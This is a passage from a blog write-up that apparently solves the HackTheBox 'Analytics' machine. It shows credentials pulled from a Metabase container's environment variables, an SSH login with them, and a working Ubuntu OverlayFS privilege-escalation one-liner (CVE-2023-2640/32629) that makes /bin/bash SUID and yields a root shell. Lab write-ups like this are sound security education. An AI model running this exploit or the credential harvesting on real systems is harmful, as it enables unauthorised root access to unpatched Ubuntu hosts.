<pre tabindex="0" class="chroma"><code class="language-gdscript3" data-lang="gdscript3"><span class="line"><span class="cl"><span class="mi">2</span><span class="n">c83a4df89a6</span><span class="p">:</span><span class="o">/$</span> <span class="n">ls</span> <span class="o">-</span><span class="n">al</span>
</span></span><span class="line"><span class="cl"><span class="n">ls</span> <span class="o">-</span><span class="n">al</span>
</span></span><span class="line"><span class="cl"><span class="n">total</span> <span class="mi">92</span>
</span></span><span class="line"><span class="cl"><span class="n">drwxr</span><span class="o">-</span><span class="n">xr</span><span class="o">-</span><span class="n">x</span>    <span class="mi">1</span> <span class="n">root</span>     <span class="n">root</span>          <span class="mi">4096</span> <span class="n">Oct</span>  <span class="mi">5</span> <span class="mi">21</span><span class="p">:</span><span class="mi">44</span> <span class="o">.</span>
</span></span><span class="line"><span class="cl"><span class="n">drwxr</span><span class="o">-</span><span class="n">xr</span><span class="o">-</span><span class="n">x</span>    <span class="mi">1</span> <span class="n">root</span>     <span class="n">root</span>          <span class="mi">4096</span> <span class="n">Oct</span>  <span class="mi">5</span> <span class="mi">21</span><span class="p">:</span><span class="mi">44</span> <span class="o">..</span>
</span></span><span class="line"><span class="cl"><span class="o">-</span><span class="n">rwxr</span><span class="o">-</span><span class="n">xr</span><span class="o">-</span><span class="n">x</span>    <span class="mi">1</span> <span class="n">root</span>     <span class="n">root</span>             <span class="mi">0</span> <span class="n">Oct</span>  <span class="mi">5</span> <span class="mi">21</span><span class="p">:</span><span class="mi">44</span> <span class="o">.</span><span class="n">dockerenv</span>
</span></span><span class="line"><span class="cl"><span class="n">drwxr</span><span class="o">-</span><span class="n">xr</span><span class="o">-</span><span class="n">x</span>    <span class="mi">1</span> <span class="n">root</span>     <span class="n">root</span>          <span class="mi">4096</span> <span class="n">Jun</span> <span class="mi">29</span> <span class="mi">20</span><span class="p">:</span><span class="mi">40</span> <span class="n">app</span>
</span></span><span class="line"><span class="cl"><span class="n">drwxr</span><span class="o">-</span><span class="n">xr</span><span class="o">-</span><span class="n">x</span>    <span class="mi">1</span> <span class="n">root</span>     <span class="n">root</span>          <span class="mi">4096</span> <span class="n">Jun</span> <span class="mi">29</span> <span class="mi">20</span><span class="p">:</span><span class="mi">39</span> <span class="n">bin</span>
</span></span><span class="line"><span class="cl"><span class="n">drwxr</span><span class="o">-</span><span class="n">xr</span><span class="o">-</span><span class="n">x</span>    <span class="mi">5</span> <span class="n">root</span>     <span class="n">root</span>           <span class="mi">340</span> <span class="n">Oct</span>  <span class="mi">5</span> <span class="mi">21</span><span class="p">:</span><span class="mi">44</span> <span class="n">dev</span>
</span></span><span class="line"><span class="cl"><span class="n">drwxr</span><span class="o">-</span><span class="n">xr</span><span class="o">-</span><span class="n">x</span>    <span class="mi">1</span> <span class="n">root</span>     <span class="n">root</span>          <span class="mi">4096</span> <span class="n">Oct</span>  <span class="mi">5</span> <span class="mi">21</span><span class="p">:</span><span class="mi">44</span> <span class="n">etc</span>
</span></span><span class="line"><span class="cl"><span class="n">drwxr</span><span class="o">-</span><span class="n">xr</span><span class="o">-</span><span class="n">x</span>    <span class="mi">1</span> <span class="n">root</span>     <span class="n">root</span>          <span class="mi">4096</span> <span class="n">Aug</span>  <span class="mi">3</span> <span class="mi">12</span><span class="p">:</span><span class="mi">16</span> <span class="n">home</span>
</span></span><span class="line"><span class="cl"><span class="n">drwxr</span><span class="o">-</span><span class="n">xr</span><span class="o">-</span><span class="n">x</span>    <span class="mi">1</span> <span class="n">root</span>     <span class="n">root</span>          <span class="mi">4096</span> <span class="n">Jun</span> <span class="mi">14</span> <span class="mi">15</span><span class="p">:</span><span class="mi">03</span> <span class="n">lib</span>
</span></span><span class="line"><span class="cl"><span class="n">drwxr</span><span class="o">-</span><span class="n">xr</span><span class="o">-</span><span class="n">x</span>    <span class="mi">5</span> <span class="n">root</span>     <span class="n">root</span>          <span class="mi">4096</span> <span class="n">Jun</span> <span class="mi">14</span> <span class="mi">15</span><span class="p">:</span><span class="mi">03</span> <span class="n">media</span>
</span></span><span class="line"><span class="cl"><span class="n">drwxr</span><span class="o">-</span><span class="n">xr</span><span class="o">-</span><span class="n">x</span>    <span class="mi">1</span> <span class="n">metabase</span> <span class="n">metabase</span>      <span class="mi">4096</span> <span class="n">Aug</span>  <span class="mi">3</span> <span class="mi">12</span><span class="p">:</span><span class="mi">17</span> <span class="n">metabase</span><span class="o">.</span><span class="n">db</span>
</span></span><span class="line"><span class="cl"><span class="n">drwxr</span><span class="o">-</span><span class="n">xr</span><span class="o">-</span><span class="n">x</span>    <span class="mi">2</span> <span class="n">root</span>     <span class="n">root</span>          <span class="mi">4096</span> <span class="n">Jun</span> <span class="mi">14</span> <span class="mi">15</span><span class="p">:</span><span class="mi">03</span> <span class="n">mnt</span>
</span></span><span class="line"><span class="cl"><span class="n">drwxr</span><span class="o">-</span><span class="n">xr</span><span class="o">-</span><span class="n">x</span>    <span class="mi">1</span> <span class="n">root</span>     <span class="n">root</span>          <span class="mi">4096</span> <span class="n">Jun</span> <span class="mi">15</span> <span class="mi">05</span><span class="p">:</span><span class="mi">12</span> <span class="n">opt</span>
</span></span><span class="line"><span class="cl"><span class="n">drwxrwxrwx</span>    <span class="mi">1</span> <span class="n">root</span>     <span class="n">root</span>          <span class="mi">4096</span> <span class="n">Aug</span>  <span class="mi">7</span> <span class="mi">11</span><span class="p">:</span><span class="mi">10</span> <span class="n">plugins</span>
</span></span><span class="line"><span class="cl"><span class="n">dr</span><span class="o">-</span><span class="n">xr</span><span class="o">-</span><span class="n">xr</span><span class="o">-</span><span class="n">x</span>  <span class="mi">212</span> <span class="n">root</span>     <span class="n">root</span>             <span class="mi">0</span> <span class="n">Oct</span>  <span class="mi">5</span> <span class="mi">21</span><span class="p">:</span><span class="mi">44</span> <span class="n">proc</span>
</span></span><span class="line"><span class="cl"><span class="n">drwx</span><span class="o">------</span>    <span class="mi">1</span> <span class="n">root</span>     <span class="n">root</span>          <span class="mi">4096</span> <span class="n">Aug</span>  <span class="mi">3</span> <span class="mi">12</span><span class="p">:</span><span class="mi">26</span> <span class="n">root</span>
</span></span><span class="line"><span class="cl"><span class="n">drwxr</span><span class="o">-</span><span class="n">xr</span><span class="o">-</span><span class="n">x</span>    <span class="mi">2</span> <span class="n">root</span>     <span class="n">root</span>          <span class="mi">4096</span> <span class="n">Jun</span> <span class="mi">14</span> <span class="mi">15</span><span class="p">:</span><span class="mi">03</span> <span class="n">run</span>
</span></span><span class="line"><span class="cl"><span class="n">drwxr</span><span class="o">-</span><span class="n">xr</span><span class="o">-</span><span class="n">x</span>    <span class="mi">2</span> <span class="n">root</span>     <span class="n">root</span>          <span class="mi">4096</span> <span class="n">Jun</span> <span class="mi">14</span> <span class="mi">15</span><span class="p">:</span><span class="mi">03</span> <span class="n">sbin</span>
</span></span><span class="line"><span class="cl"><span class="n">drwxr</span><span class="o">-</span><span class="n">xr</span><span class="o">-</span><span class="n">x</span>    <span class="mi">2</span> <span class="n">root</span>     <span class="n">root</span>          <span class="mi">4096</span> <span class="n">Jun</span> <span class="mi">14</span> <span class="mi">15</span><span class="p">:</span><span class="mi">03</span> <span class="n">srv</span>
</span></span><span class="line"><span class="cl"><span class="n">dr</span><span class="o">-</span><span class="n">xr</span><span class="o">-</span><span class="n">xr</span><span class="o">-</span><span class="n">x</span>   <span class="mi">13</span> <span class="n">root</span>     <span class="n">root</span>             <span class="mi">0</span> <span class="n">Oct</span>  <span class="mi">5</span> <span class="mi">21</span><span class="p">:</span><span class="mi">44</span> <span class="n">sys</span>
</span></span><span class="line"><span class="cl"><span class="n">drwxrwxrwt</span>    <span class="mi">1</span> <span class="n">root</span>     <span class="n">root</span>          <span class="mi">4096</span> <span class="n">Oct</span>  <span class="mi">7</span> <span class="mi">20</span><span class="p">:</span><span class="mi">00</span> <span class="n">tmp</span>
</span></span><span class="line"><span class="cl"><span class="n">drwxr</span><span class="o">-</span><span class="n">xr</span><span class="o">-</span><span class="n">x</span>    <span class="mi">1</span> <span class="n">root</span>     <span class="n">root</span>          <span class="mi">4096</span> <span class="n">Jun</span> <span class="mi">29</span> <span class="mi">20</span><span class="p">:</span><span class="mi">39</span> <span class="n">usr</span>
</span></span><span class="line"><span class="cl"><span class="n">drwxr</span><span class="o">-</span><span class="n">xr</span><span class="o">-</span><span class="n">x</span>    <span class="mi">1</span> <span class="n">root</span>     <span class="n">root</span>          <span class="mi">4096</span> <span class="n">Jun</span> <span class="mi">14</span> <span class="mi">15</span><span class="p">:</span><span class="mi">03</span> <span class="k">var</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>A short bit of enumeration later, we can find a very interesting entry into our environment:</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">2c83a4df89a6:/app$ env
</span></span><span class="line"><span class="cl">env
</span></span><span class="line"><span class="cl">SHELL=/bin/sh
</span></span><span class="line"><span class="cl">MB_DB_PASS=
</span></span><span class="line"><span class="cl">HOSTNAME=2c83a4df89a6
</span></span><span class="line"><span class="cl">LANGUAGE=en_US:en
</span></span><span class="line"><span class="cl">MB_JETTY_HOST=0.0.0.0
</span></span><span class="line"><span class="cl">JAVA_HOME=/opt/java/openjdk
</span></span><span class="line"><span class="cl">MB_DB_FILE=//metabase.db/metabase.db
</span></span><span class="line"><span class="cl">PWD=/app
</span></span><span class="line"><span class="cl">LOGNAME=metabase
</span></span><span class="line"><span class="cl">MB_EMAIL_SMTP_USERNAME=
</span></span><span class="line"><span class="cl">HOME=/home/metabase
</span></span><span class="line"><span class="cl">LANG=en_US.UTF-8
</span></span><span class="line"><span class="cl">META_USER=metalytics
</span></span><span class="line"><span class="cl">META_PASS=An4lytics_ds20223#
</span></span><span class="line"><span class="cl">MB_EMAIL_SMTP_PASSWORD=
</span></span><span class="line"><span class="cl">&lt;...SNIP...&gt;
</span></span></code></pre></td></tr></table>
</div>
</div><p>We have a pair of credentials as <code>metalytics:An4lytics_ds20223#</code>
Using this, we can ssh into the system outside of the docker container:</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span><span class="lnt">5
</span><span class="lnt">6
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">â”Œâ”€â”€(kaliã‰¿kali)-[~]
</span></span><span class="line"><span class="cl">â””â”€$ ssh metalytics@10.10.11.233
</span></span><span class="line"><span class="cl">metalytics@10.129.147.5&#39;s password: 
</span></span><span class="line"><span class="cl">Welcome to Ubuntu 22.04.3 LTS (GNU/Linux 6.2.0-25-generic x86_64)
</span></span><span class="line"><span class="cl">&lt;...SNIP...&gt;
</span></span><span class="line"><span class="cl">metalytics@analytics:~$ 
</span></span></code></pre></td></tr></table>
</div>
</div><h2 id="privilege-escalation">Privilege Escalation
</h2><p>The next step was quite troublesome with no real indication of vulnerability. Since the CVE is so recent, most common vulnerability scanners do not pick up on it. However, if your eye is keen enough, you can pick up on the Ubuntu kernel version:</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">metalytics@analytics:/tmp$ cat /etc/issue
</span></span><span class="line"><span class="cl">Ubuntu 22.04.3 LTS \n \l
</span></span></code></pre></td></tr></table>
</div>
</div><p>A google search for this version, and you can quickly find posts about <a class="link" href="https://www.reddit.com/r/selfhosted/comments/15ecpck/ubuntu_local_privilege_escalation_cve20232640/"  target="_blank" rel="noopener"
    >CVE-2023-2640 &amp; CVE-2023-32629</a>. In this post, there are a couple example 1 liners we can try to execute. Trying the first POC with id:</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span><span class="lnt">5
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">metalytics@analytics:~$ unshare -rm sh -c &#34;mkdir l u w m &amp;&amp; cp /u*/b*/p*3 l/; setcap cap_setuid+eip l/python3;mount -t overlay overlay -o rw,lowerdir=l,upperdir=u,workdir=w m &amp;&amp; touch m/*;&#34; &amp;&amp; u/python3 -c &#39;import os;os.setuid(0);os.system(&#34;id&#34;)&#39;mkdir: cannot create directory â€˜lâ€™: File exists
</span></span><span class="line"><span class="cl">mkdir: cannot create directory â€˜uâ€™: File exists
</span></span><span class="line"><span class="cl">mkdir: cannot create directory â€˜wâ€™: File exists
</span></span><span class="line"><span class="cl">mkdir: cannot create directory â€˜mâ€™: File exists
</span></span><span class="line"><span class="cl">uid=0(root) gid=1000(metalytics) groups=1000(metalytics)
</span></span></code></pre></td></tr></table>
</div>
</div><p>Although there are some error messages, we can see the <code>id</code> is processed, and we are shown to have uid of root! Next, we can try supplying a malicious command, making a <code>SUID</code> out of bash. This will allow anybody to spawn a bash session as root:</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span><span class="lnt">5
</span><span class="lnt">6
</span><span class="lnt">7
</span><span class="lnt">8
</span><span class="lnt">9
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">metalytics@analytics:~$ unshare -rm sh -c &#34;mkdir l u w m &amp;&amp; cp /u*/b*/p*3 l/; setcap cap_setuid+eip l/python3;mount -t overlay overlay -o rw,lowerdir=l,upperdir=u,workdir=w m &amp;&amp; touch m/*;&#34; &amp;&amp; u/python3 -c &#39;import os;os.setuid(0);os.system(&#34;chmod +s /bin/bash&#34;)&#39;
</span></span><span class="line"><span class="cl">mkdir: cannot create directory â€˜lâ€™: File exists
</span></span><span class="line"><span class="cl">mkdir: cannot create directory â€˜uâ€™: File exists
</span></span><span class="line"><span class="cl">mkdir: cannot create directory â€˜wâ€™: File exists
</span></span><span class="line"><span class="cl">mkdir: cannot create directory â€˜mâ€™: File exists
</span></span><span class="line"><span class="cl">Failed to set capabilities on file `l/python3&#39; (No such file or directory)
</span></span><span class="line"><span class="cl">The value of the capability argument is not permitted for a file. Or the file is not a regular (non-symlink) file
</span></span><span class="line"><span class="cl">metalytics@analytics:~$ ls -al /bin/bash
</span></span><span class="line"><span class="cl">-rwsr-sr-x 1 root root 1396520 Jan  6  2022 /bin/bash
</span></span></code></pre></td></tr></table>
</div>
</div><p>We still get an error about capability permissions, but when we look at the bash file, we can see SUID is set! we can now enter a bash session as root:</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">metalytics@analytics:~$ bash -p
</span></span><span class="line"><span class="cl">bash-5.1# whoami
</span></span><span class="line"><span class="cl">root
</span></span><span class="line"><span class="cl">bash-5.1# 
</span></span></code></pre></td></tr></table>
</div>
</div>
</section>


    <footer class="article-footer">
    
    <section class="article-tags">
        
            <a href="/tags/remote-code-execution/">Remote Code Execution</a>
        
            <a href="/tags/metabase/">Metabase</a>
        
            <a href="/tags/docker/">Docker</a>
        
    </section>


    
    <section class="article-copyright">
        <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-copyright" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
  <path stroke="none" d="M0 0h24v24H0z"/>
  <circle cx="12" cy="12" r="9" />
  <path d="M14.5 9a3.5 4 0 1 0 0 6" />
</svg>



        <span>Licensed under CC BY-NC-SA 4.0</span>
    </section>
    </footer>


    
</article>

    

    

<aside class="related-content--wrapper">
    <h2 class="section-title">Related content</h2>
    <div class="related-content">
        <div class="flex article-list--tile">
            
                
<article class="has-image">
    <a href="/p/hackthebox-monitorstwo/">
        
        
            <div class="article-image">
                <img src="/p/hackthebox-monitorstwo/MonitorsTwo.7bcf0cb787855b0537bc7c5327c0f7dd_hu11328676933836087193.png" 
                        width="250" 
                        height="150" 
                        loading="lazy"
                        alt="Featured image of post HackTheBox - MonitorsTwo"
                        
                        data-hash="md5-e88Mt4eFWwU3vHxTJ8D33Q==">
                
            </div>
        

        <div class="article-details">
            <h2 class="article-title">HackTheBox - MonitorsTwo</h2>
        </div>
    </a>
</article>

            
                
<article class="has-image">
    <a href="/p/hackthebox-busqueda/">
        
        
            <div class="article-image">
                <img src="/p/hackthebox-busqueda/Busqueda.fc4856cd6b9e5aa954d7face3968a69d_hu12336566156959704981.png" 
                        width="250" 
                        height="150" 
                        loading="lazy"
                        alt="Featured image of post HackTheBox - Busqueda"
                        
                        data-hash="md5-/EhWzWueWqlU1/rOOWimnQ==">
                
            </div>
        

        <div class="article-details">
            <h2 class="article-title">HackTheBox - Busqueda</h2>
        </div>
    </a>
</article>

            
                
<article class="has-image">
    <a href="/p/hackthebox-devvortex/">
        
        
            <div class="article-image">
                <img src="/p/hackthebox-devvortex/Devvortex.61ba3466bff8da52f89d2bb6417fb83a_hu4257021157125360887.png" 
                        width="250" 
                        height="150" 
                        loading="lazy"
                        alt="Featured image of post HackTheBox - Devvortex"
                        
                        data-hash="md5-Ybo0Zr/42lL4nSu2QX&#43;4Og==">
                
            </div>
        

        <div class="article-details">
            <h2 class="article-title">HackTheBox - Devvortex</h2>
        </div>
    </a>
</article>

            
                
<article class="has-image">
    <a href="/p/hackthebox-surveillance/">
        
        
            <div class="article-image">
                <img src="/p/hackthebox-surveillance/Surveillance.8b9fd8fd814572f9ed8f343a005ca93c_hu1936471103572467903.png" 
                        width="250" 
                        height="150" 
                        loading="lazy"
                        alt="Featured image of post HackTheBox - Surveillance"
                        
                        data-hash="md5-i5/Y/YFFcvntjzQ6AFypPA==">
                
            </div>
        

        <div class="article-details">
            <h2 class="article-title">HackTheBox - Surveillance</h2>
        </div>
    </a>
</article>

            
                
<article class="has-image">
    <a href="/p/hackthebox-hospital/">
        
        
            <div class="article-image">
                <img src="/p/hackthebox-hospital/Hospital.dd28dc96da49df800b952a77639d4857_hu7748615803054416032.png" 
                        width="250" 
                        height="150" 
                        loading="lazy"
                        alt="Featured image of post HackTheBox - Hospital"
                        
                        data-hash="md5-3SjcltpJ34ALlSp3Y51IVw==">
                
            </div>
        

        <div class="article-details">
            <h2 class="article-title">HackTheBox - Hospital</h2>
        </div>
    </a>
</article>

            
        </div>
    </div>
</aside>

     
    
        
    <div class="disqus-container">
    <div id="disqus_thread"></div>
<script>
    window.disqus_config = function () {
    
    
    
    };
    (function() {
        if (["localhost", "127.0.0.1"].indexOf(window.location.hostname) != -1) {
            document.getElementById('disqus_thread').innerHTML = 'Disqus comments not available by default when the website is previewed locally.';
            return;
        }
        var d = document, s = d.createElement('script'); s.async = true;
        s.src = '//' + "hugo-theme-stack" + '.disqus.com/embed.js';
        s.setAttribute('data-timestamp', +new Date());
        (d.head || d.body).appendChild(s);
    })();
</script>
<noscript>Please enable JavaScript to view the <a href="https://disqus.com/?ref_noscript">comments powered by Disqus.</a></noscript>
<a href="https://disqus.com" class="dsq-brlink">comments powered by <span class="logo-disqus">Disqus</span></a>
</div>

<style>
    .disqus-container {
        background-color: var(--card-background);
        border-radius: var(--card-border-radius);
        box-shadow: var(--shadow-l1);
        padding: var(--card-padding);
    }
</style>

<script>
    window.addEventListener('onColorSchemeChange', (e) => {
        if (typeof DISQUS == 'object') {
            DISQUS.reset({
                reload: true
            });
        }
    })
</script>

    

    <footer class="site-footer">
    <section class="copyright">
        &copy; 
        
            2020 - 
        
        2024 Spencer&#39;s Blog
    </section>
    
    <section class="powerby">
        Built with <a href="https://gohugo.io/" target="_blank" rel="noopener">Hugo</a> <br />
        Theme <b><a href="https://github.com/CaiJimmy/hugo-theme-stack" target="_blank" rel="noopener" data-version="3.29.0">Stack</a></b> designed by <a href="https://jimmycai.com" target="_blank" rel="noopener">Jimmy</a>
    </section>
</footer>


    
<div class="pswp" tabindex="-1" role="dialog" aria-hidden="true">

    
    <div class="pswp__bg"></div>

    
    <div class="pswp__scroll-wrap">

        
        <div class="pswp__container">
            <div class="pswp__item"></div>
            <div class="pswp__item"></div>
            <div class="pswp__item"></div>
        </div>

        
        <div class="pswp__ui pswp__ui--hidden">

            <div class="pswp__top-bar">

                

                <div class="pswp__counter"></div>

                <button class="pswp__button pswp__button--close" title="Close (Esc)"></button>

                <button class="pswp__button pswp__button--share" title="Share"></button>

                <button class="pswp__button pswp__button--fs" title="Toggle fullscreen"></button>

                <button class="pswp__button pswp__button--zoom" title="Zoom in/out"></button>

                
                
                <div class="pswp__preloader">
                    <div class="pswp__preloader__icn">
                        <div class="pswp__preloader__cut">
                            <div class="pswp__preloader__donut"></div>
                        </div>
                    </div>
                </div>
            </div>

            <div class="pswp__share-modal pswp__share-modal--hidden pswp__single-tap">
                <div class="pswp__share-tooltip"></div>
            </div>

            <button class="pswp__button pswp__button--arrow--left" title="Previous (arrow left)">
            </button>

            <button class="pswp__button pswp__button--arrow--right" title="Next (arrow right)">
            </button>

            <div class="pswp__caption">
                <div class="pswp__caption__center"></div>
            </div>

        </div>

    </div>

</div><script 
                src="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe.min.js"integrity="sha256-ePwmChbbvXbsO02lbM3HoHbSHTHFAeChekF1xKJdleo="crossorigin="anonymous"
                defer
                >
            </script><script 
                src="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe-ui-default.min.js"integrity="sha256-UKkzOn/w1mBxRmLLGrSeyB4e1xbrp4xylgAWb3M42pU="crossorigin="anonymous"
                defer
                >
            </script><link 
                rel="stylesheet" 
                href="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/default-skin/default-skin.min.css"crossorigin="anonymous"
            ><link 
                rel="stylesheet" 
                href="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe.min.css"crossorigin="anonymous"
            >

            </main>
        </div>
        <script 
                src="https://cdn.jsdelivr.net/npm/node-vibrant@3.1.6/dist/vibrant.min.js"integrity="sha256-awcR2jno4kI5X0zL8ex0vi2z&#43;KMkF24hUW8WePSA9HM="crossorigin="anonymous"
                
                >
            </script><script type="text/javascript" src="/ts/main.799eb5847effe83ae252baf7b2236f0c3752b0188dd0985faa7efc75ea805b29.js" defer></script>
<script>
    (function () {
        const customFont = document.createElement('link');
        customFont.href = "https://fonts.googleapis.com/css2?family=Lato:wght@300;400;700&display=swap";

        customFont.type = "text/css";
        customFont.rel = "stylesheet";

        document.head.appendChild(customFont);
    }());
</script>

    </body>
</html>
